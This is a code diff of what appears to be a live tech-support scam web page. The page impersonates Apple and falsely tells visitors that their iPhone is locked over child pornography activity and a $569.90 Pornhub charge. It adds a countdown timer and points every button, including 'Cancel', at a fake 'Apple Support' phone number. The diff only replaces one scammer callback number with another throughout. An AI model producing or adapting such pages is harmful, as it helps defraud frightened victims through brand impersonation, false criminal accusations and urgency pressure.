@@ -61,9 +61,9 @@
     <div class="alert-texts">
         <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
     <div class="txstm"> <br>
-        Not you? Call <strong>Apple Support: <br><a href="tel:+1-415-646-5334">(415) 646-5334</a></strong> to unlock your device.
+        Not you? Call <strong>Apple Support: <br><a href="tel:+1-202-352-4094">(202) 352-4094</a></strong> to unlock your device.
      </div>
-    <a href="tel:+1-415-646-5334" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
+    <a href="tel:+1-202-352-4094" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
     
     </div>
 </div>
@@ -82,7 +82,7 @@
   <div class="notification-header">Payment Successful</div>
   <div class="notification-body">
     Sent $569.90 via Apple Pay to Pornhub <br>Premium.
-    Not you? Call (415) 646-5334
+    Not you? Call (202) 352-4094
   </div>
   <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
 </div>
@@ -96,13 +96,13 @@
             <div class="modal-content">
                 <div class="modal-body text-center">
                     <div class="alert-text">
-                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-415-646-5334">(415) 646-5334</a> to unlock it!
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-202-352-4094">(202) 352-4094</a> to unlock it!
                     </div>
 
                     
                     <div class="text-end gap-4 mt-3 actionbtn">
-                        <a href="tel:+1-415-646-5334" class="me-2 bg-primary">Call (415) 646-5334</a>
-                        <a href="tel:+1-415-646-5334" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                        <a href="tel:+1-202-352-4094" class="me-2 bg-primary">Call (202) 352-4094</a>
+                        <a href="tel:+1-202-352-4094" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                     </div>
                 </div>
             </div>
@@ -218,13 +218,13 @@ const timer = setInterval(() => {
                 <div class="modal-content" id="applealertmodeltwo">
                     <div class="modal-body text-center">
                         <div class="alert-text">
-                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-415-646-5334">(415) 646-5334</a> to unlock it!
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-202-352-4094">(202) 352-4094</a> to unlock it!
                         </div>
 
                         
                         <div class="text-end gap-4 mt-3 actionbtn">
-                            <a href="tel:+1-415-646-5334" class="me-2 bg-primary">Call (415) 646-5334</a>
-                            <a href="tel:+1-415-646-5334" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                            <a href="tel:+1-202-352-4094" class="me-2 bg-primary">Call (202) 352-4094</a>
+                            <a href="tel:+1-202-352-4094" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
                         </div>
                     </div>
                 </div>
